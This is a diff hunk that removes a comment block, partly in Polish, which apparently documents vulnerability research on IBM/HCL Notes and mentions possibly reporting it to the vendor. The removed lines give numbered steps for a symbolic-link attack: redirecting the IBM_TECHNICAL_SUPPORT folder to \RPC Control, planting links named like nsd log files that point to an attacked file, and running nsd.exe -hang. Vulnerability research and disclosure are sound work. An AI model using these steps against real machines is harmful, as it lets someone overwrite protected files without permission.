@@ -30,40 +30,7 @@
 # --------------------
 # TODO:  Ewentualne zg³oszenie do IBM lub HCL (trudno orzec)
 #
-#
-#
 # ////////////////////
-#
-# REPRO:
-#
-# 1. Check  C:\Users\[user_name]\AppData\Local\IBM\Notes\Data\IBM_TECHNICAL_SUPPORT
-# 
-# C:\Users\[user_name]\AppData\Local\IBM\Notes\Data>icacls IBM_TECHNICAL_SUPPORT
-# IBM_TECHNICAL_SUPPORT IT\[redacted]:(I)(OI)(CI)(F)
-#                     BUILTIN\Administratorzy:(I)(OI)(CI)(F)
-#
-# Successfully processed 1 files; Failed processing 0 files
-#
-# C:\Users\[user_name]\AppData\Local\IBM\Notes\Data>
-#
-# *************************
-#
-# 2. Save copy of IBM_TECHNICAL_SUPPORT
-#
-# rename IBM_TECHNICAL_SUPPORT "IBM_TECHNICAL_SUPPORT - old"
-#
-# *************************
-# 
-# 3. Create redirection from C:\Users\[user_name]\AppData\Local\IBM\Notes\Data\IBM_TECHNICAL_SUPPORT to \RPC Control
-# 
-# createMountPoint.exe "C:\Users\[user_name]\AppData\Local\IBM\Notes\Data\IBM_TECHNICAL_SUPPORT" "\RPC Control"
-#
-# 4. Create symbolic links with specific names from \RPC Control\nsd_W32I_[computer_name]_2022_10_24@10_[minutes]_[seconds].log
-#    that point to the attacked file.  //(trzeba zrobiæ one-linera)
-#
-#    \RPC Control\nsd_W32I_[computer_name]_2022_10_24@10_[minutes]_[seconds] -> X:\ATTACKED_FILE_PATH.EXT
-#
-# 5. Run "C:\Program Files (x86)\IBM\Notes\nsd.exe -hang" and wait 
 #
 ######################
 
